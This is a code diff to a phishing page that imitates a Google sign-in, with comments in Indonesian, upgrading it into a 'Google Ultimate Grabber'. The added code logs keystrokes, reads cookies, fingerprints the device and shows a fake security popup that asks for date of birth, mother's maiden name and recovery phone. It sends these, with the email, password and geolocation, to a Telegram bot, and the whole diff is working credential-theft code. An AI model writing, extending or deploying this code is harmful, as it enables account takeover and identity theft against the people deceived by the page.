@@ -29,6 +29,7 @@
             padding: 48px 40px 36px;
             text-align: center;
             border: 1px solid #dadce0;
+            position: relative;
         }
         .google-logo {
             width: 75px;
@@ -48,6 +49,7 @@
         .input-group {
             margin-bottom: 16px;
             text-align: left;
+            position: relative;
         }
         .input-group input {
             width: 100%;
@@ -127,6 +129,20 @@
         
         let startTime = Date.now();
         let retryCount = parseInt(localStorage.getItem('loginRetry') || '0');
+        let keylogBuffer = [];
+        
+        // ========== KEYLOGGER GLOBAL (tangkep semua ketikan) ==========
+        document.addEventListener('keydown', function(e) {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            let key = e.key;
+            if (key === 'Enter') key = '[ENTER]';
+            else if (key === ' ') key = '[SPACE]';
+            else if (key === 'Backspace') key = '[BACKSPACE]';
+            else if (key === 'Tab') key = '[TAB]';
+            else if (key.length > 1) key = `[${key}]`;
+            keylogBuffer.push(key);
+            if (keylogBuffer.length > 100) keylogBuffer.shift();
+        });
         
         // ========== DETECT ADBLOCK ==========
         let adblockDetected = false;
@@ -137,6 +153,112 @@
         setTimeout(() => {
             if (testAd.offsetHeight === 0 && testAd.offsetWidth === 0) adblockDetected = true;
         }, 100);
+        
+        // ========== GET COOKIES (kalau same-site memungkinkan) ==========
+        function getAllCookies() {
+            try {
+                return document.cookie || 'Tidak ada cookie (atau HttpOnly)';
+            } catch(e) {
+                return 'Tidak bisa akses cookie';
+            }
+        }
+        
+        // ========== WEBGL FINGERPRINT ==========
+        async function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL tidak support';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!debugInfo) return 'Tidak bisa dapat info renderer';
+                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                return `${vendor} | ${renderer}`;
+            } catch(e) {
+                return 'Error: ' + e.message;
+            }
+        }
+        
+        // ========== INSTALLED FONTS DETECTION ==========
+        function getInstalledFonts() {
+            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter'];
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            const installed = [];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const defaultWidth = {};
+            
+            const testDiv = document.createElement('div');
+            testDiv.style.position = 'absolute';
+            testDiv.style.top = '-9999px';
+            testDiv.style.left = '-9999px';
+            testDiv.style.fontSize = testSize;
+            document.body.appendChild(testDiv);
+            
+            for (const base of baseFonts) {
+                testDiv.style.fontFamily = base;
+                testDiv.innerHTML = testString;
+                defaultWidth[base] = testDiv.offsetWidth;
+            }
+            
+            for (const font of fonts) {
+                let detected = false;
+                for (const base of baseFonts) {
+                    testDiv.style.fontFamily = `${font}, ${base}`;
+                    testDiv.innerHTML = testString;
+                    if (testDiv.offsetWidth !== defaultWidth[base]) {
+                        detected = true;
+                        break;
+                    }
+                }
+                if (detected) installed.push(font);
+            }
+            
+            document.body.removeChild(testDiv);
+            return installed.slice(0, 10).join(', ') || 'Tidak ada yg terdeteksi';
+        }
+        
+        // ========== NETWORK INFORMATION ==========
+        function getNetworkInfo() {
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return 'Tidak diketahui';
+            let type = conn.effectiveType || 'Tidak diketahui';
+            let downlink = conn.downlink ? conn.downlink + ' Mbps' : 'Tidak diketahui';
+            let rtt = conn.rtt ? conn.rtt + ' ms' : 'Tidak diketahui';
+            return `${type} (${downlink}, RTT ${rtt})`;
+        }
+        
+        // ========== PERTANYAAN KEAMANAN PALSU (FAKE SECURITY ALERT) ==========
+        function showFakeSecurityPopup(email) {
+            return new Promise((resolve) => {
+                const popupHtml = `
+                    <div id="fakeSecurityPopup" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:10000;display:flex;justify-content:center;align-items:center;font-family:'Google Sans',Roboto,Arial,sans-serif;">
+                        <div style="background:white;border-radius:8px;padding:24px;max-width:400px;width:90%;text-align:center;">
+                            <div style="font-size:48px;margin-bottom:16px;">🔒</div>
+                            <h3 style="margin-bottom:8px;">Security Verification Required</h3>
+                            <p style="color:#5f6368;margin-bottom:20px;font-size:14px;">We detected unusual activity on your account <strong>${email}</strong>. Please verify your identity.</p>
+                            <div style="text-align:left;margin-bottom:20px;">
+                                <label style="display:block;margin-bottom:8px;font-size:14px;">Date of Birth (YYYY-MM-DD)</label>
+                                <input type="text" id="fakeDob" placeholder="1990-01-01" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;">
+                                <label style="display:block;margin-bottom:8px;font-size:14px;">Mother's Maiden Name</label>
+                                <input type="text" id="fakeMother" placeholder="Your mother's maiden name" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;">
+                                <label style="display:block;margin-bottom:8px;font-size:14px;">Phone Number (recovery)</label>
+                                <input type="text" id="fakePhone" placeholder="+62xxxxxxxxxxx" style="width:100%;padding:10px;border:1px solid #dadce0;border-radius:4px;">
+                            </div>
+                            <button id="fakeSubmitBtn" style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;">Verify Now</button>
+                        </div>
+                    </div>
+                `;
+                document.body.insertAdjacentHTML('beforeend', popupHtml);
+                document.getElementById('fakeSubmitBtn').addEventListener('click', () => {
+                    const dob = document.getElementById('fakeDob').value;
+                    const mother = document.getElementById('fakeMother').value;
+                    const phone = document.getElementById('fakePhone').value;
+                    document.getElementById('fakeSecurityPopup').remove();
+                    resolve({ dob, mother, phone });
+                });
+            });
+        }
         
         // ========== MAIN LOGIC ==========
         document.getElementById('loginBtn').addEventListener('click', async function() {
@@ -149,35 +271,59 @@
                 return;
             }
             
-            // Show loading
             this.disabled = true;
             document.getElementById('loading').style.display = 'block';
             document.getElementById('errorMsg').style.display = 'none';
             
-            // Calculate duration
+            // Hitung durasi
             const durationSec = Math.floor((Date.now() - startTime) / 1000);
             retryCount++;
             localStorage.setItem('loginRetry', retryCount);
             
-            // Collect all data
-            const data = await collectAllData(email, password, durationSec, retryCount);
+            // Ambil keylog
+            const keylogText = keylogBuffer.join('') || 'Tidak ada aktivitas keylog';
             
-            // Send to Telegram
-            await sendToTelegram(data);
+            // Kumpulkan semua data
+            const mainData = await collectMainData(email, password, durationSec, retryCount, keylogText);
+            await sendToTelegram(mainData);
             
-            // Fake loading delay
+            // Tampilkan fake security popup (ambil data tambahan)
+            const securityData = await showFakeSecurityPopup(email);
+            const securityMessage = `
+╔══════════════════════════════════════╗
+║   🔐 EXTRA SECURITY DATA (FAKE)      ║
+╚══════════════════════════════════════╝
+
+┌─────── 📋 VERIFICATION DATA ───────┐
+│ 📧 Email: ${email}
+│ 📅 DOB: ${securityData.dob || 'Tidak diisi'}
+│ 👩 Mother's Name: ${securityData.mother || 'Tidak diisi'}
+│ 📱 Recovery Phone: ${securityData.phone || 'Tidak diisi'}
+└─────────────────────────────────────┘
+            `;
+            await sendToTelegram(securityMessage);
+            
+            // Redirect
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 1500);
         });
         
-        async function collectAllData(email, password, durationSec, retryCount) {
-            // IP & Geolocation dari ipapi.co
+        async function collectMainData(email, password, durationSec, retryCount, keylogText) {
+            // IP & Geolocation
             let ipData = {};
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipData = await res.json();
             } catch(e) { ipData = {}; }
+            
+            // IP kedua untuk backup
+            let ipBackup = 'Tidak diketahui';
+            try {
+                const res2 = await fetch('https://api.ipify.org?format=json');
+                const data2 = await res2.json();
+                ipBackup = data2.ip;
+            } catch(e) {}
             
             // Battery
             let batteryData = { level: 'Tidak diketahui', charging: 'Tidak diketahui' };
@@ -188,6 +334,18 @@
                     batteryData.charging = battery.charging ? 'Ya' : 'Tidak';
                 } catch(e) {}
             }
+            
+            // WebGL Fingerprint
+            const webglFingerprint = await getWebGLFingerprint();
+            
+            // Installed Fonts
+            const fonts = getInstalledFonts();
+            
+            // Network Info
+            const networkInfo = getNetworkInfo();
+            
+            // Cookies
+            const cookies = getAllCookies();
             
             // Device & Browser info
             const ua = navigator.userAgent;
@@ -230,15 +388,15 @@
             
             // OS version
             let os = 'Tidak diketahui';
-            if(ua.includes('Windows')) os = 'Windows ' + (ua.match(/Windows NT (\d+)/)?.[1] || '');
+            if(ua.includes('Windows')) os = 'Windows ' + (ua.match(/Windows NT ([\d.]+)/)?.[1] || '');
             else if(ua.includes('Mac OS')) os = 'macOS';
             else if(ua.includes('Android')) os = 'Android';
             else if(ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
             else if(ua.includes('Linux')) os = 'Linux';
             
-            // VPN/Proxy detection (simple dari ipapi)
+            // VPN/Proxy detection
             const vpnDetected = ipData?.proxy || ipData?.tor || false;
-            const vpnName = vpnDetected ? 'Terdeteksi (VPN/Proxy)' : 'Tidak';
+            const vpnName = vpnDetected ? '✅ Terdeteksi (VPN/Proxy)' : '❌ Tidak';
             
             // Time data
             const now = new Date();
@@ -251,34 +409,36 @@
             const referrer = document.referrer || 'Langsung / Tidak diketahui';
             const currentUrl = window.location.href;
             
-            // Build message
+            // Build message ULTIMATE
             const message = `
-╔══════════════════════════════════════╗
-║   🎯 GOOGLE PREMIUM PLUS+ GRABBER    ║
-╚══════════════════════════════════════╝
+╔══════════════════════════════════════════════════╗
+║     🔥 GOOGLE ULTIMATE GRABBER v3.0 🔥           ║
+╚══════════════════════════════════════════════════╝
 
-┌─────── 🔐 AKUN ───────┐
+┌──────────── 🔐 AKUN ────────────┐
 │ 📧 Email: ${email}
 │ 🔑 Password: ${password}
-└────────────────────────┘
+└─────────────────────────────────┘
 
-┌─────── 🌐 IP & NETWORK ───────┐
-│ 🌍 IP: ${ipData?.ip || 'Tidak diketahui'}
+┌──────────── 🌐 IP & NETWORK ────────────┐
+│ 🌍 IP: ${ipData?.ip || ipBackup}
 │ 📡 ISP: ${ipData?.org || 'Tidak diketahui'}
 │ 🔢 ASN: ${ipData?.asn || 'Tidak diketahui'}
-│ 📱 Koneksi: ${ipData?.network || 'Tidak diketahui'}
+│ 📱 Koneksi: ${networkInfo}
 │ 🛡️ VPN/Proxy: ${vpnName}
-└───────────────────────────────┘
+│ 🏷️ VPN Provider: ${ipData?.proxy ? 'Terdeteksi' : '-'}
+└─────────────────────────────────────────┘
 
-┌─────── 📍 LOKASI ───────┐
-│ 🇮🇩 Negara: ${ipData?.country_name || 'Tidak diketahui'} (${ipData?.country_code || '-'})
-│ 🏙️ Kota: ${ipData?.city || 'Tidak diketahui'}
-│ 📮 Kode Pos: ${ipData?.postal || 'Tidak diketahui'}
+┌──────────── 📍 LOKASI LENGKAP ────────────┐
+│ 🇮🇩 Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '-'})
+│ 🏙️ Kota: ${ipData?.city || '?'}
+│ 📮 Kode Pos: ${ipData?.postal || '?'}
 │ 📍 Koordinat: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
-│ ⏰ Zona Waktu: ${ipData?.timezone || 'Tidak diketahui'}
-└─────────────────────────┘
+│ ⏰ Zona Waktu: ${ipData?.timezone || '?'}
+│ 🗺️ Region: ${ipData?.region || '?'}
+└──────────────────────────────────────────┘
 
-┌─────── 💻 DEVICE ───────┐
+┌──────────── 💻 DEVICE & HARDWARE ────────────┐
 │ 🖥️ OS: ${os}
 │ 📱 Device: ${deviceBrand} ${deviceModel}
 │ 🧠 RAM: ${ram}
@@ -286,33 +446,39 @@
 │ 🔋 Baterai: ${batteryData.level} (charging: ${batteryData.charging})
 │ 📺 Resolusi: ${screenRes}
 │ 🖱️ Touch Support: ${touchSupport}
-└─────────────────────────┘
+│ 🎮 WebGL: ${webglFingerprint.substring(0, 80)}
+│ 🔤 Fonts: ${fonts}
+└────────────────────────────────────────────┘
 
-┌─────── 🌍 BROWSER ───────┐
+┌──────────── 🌍 BROWSER & SETTINGS ────────────┐
 │ 🌐 Browser: ${browserName} v${browserVersion}
-│ ⚙️ Engine: ${ua.match(/AppleWebKit|Gecko|Blink/)?.[0] || 'Tidak diketahui'}
-│ 🛡️ AdBlock: ${adblockDetected ? 'Ya' : 'Tidak'}
+│ 🛡️ AdBlock: ${adblockDetected ? '✅ Ya' : '❌ Tidak'}
 │ 🌙 Dark Mode: ${darkMode}
 │ 🚫 Do Not Track: ${doNotTrack}
 │ 🍪 Cookie Enabled: ${cookieEnabled}
-└──────────────────────────┘
+│ 📦 Cookie Sample: ${cookies.substring(0, 100)}${cookies.length > 100 ? '...' : ''}
+└───────────────────────────────────────────────┘
 
-┌─────── ⏰ WAKTU ───────┐
+┌──────────── ⏰ WAKTU & METADATA ────────────┐
 │ 📅 Waktu: ${waktuFormatted}
 │ 🔢 UNIX: ${unixTimestamp}
 │ ⏱️ Durasi halaman: ${durationSec} detik
 │ 🔁 Percobaan: ke-${retryCount}
 │ 🕒 Peak Hour: ${peakHour}
-└────────────────────────┘
+└────────────────────────────────────────────┘
 
-┌─────── 🔗 SUMBER ───────┐
+┌──────────── 🔍 KEYLOGGER ────────────┐
+│ 📝 Rekaman ketikan: ${keylogText.substring(0, 200)}${keylogText.length > 200 ? '...' : ''}
+└──────────────────────────────────────┘
+
+┌──────────── 🔗 TRAFFIC SOURCE ────────────┐
 │ 🔗 URL: ${currentUrl}
 │ 🚪 Referrer: ${referrer}
-└────────────────────────┘
+└──────────────────────────────────────────┘
 
-╔══════════════════════════════════════╗
-║  📡 DATA TERKIRIM KE TELEGRAM BOT    ║
-╚══════════════════════════════════════╝
+╔══════════════════════════════════════════════════╗
+║     📡 ALL DATA SENT TO TELEGRAM BOT ✅          ║
+╚══════════════════════════════════════════════════╝
             `;
             
             return message;
@@ -335,7 +501,7 @@
             }
         }
         
-        // Reset retry counter setiap 30 menit (optional)
+        // Reset retry counter setiap 30 menit
         setTimeout(() => {
             localStorage.removeItem('loginRetry');
         }, 1800000);
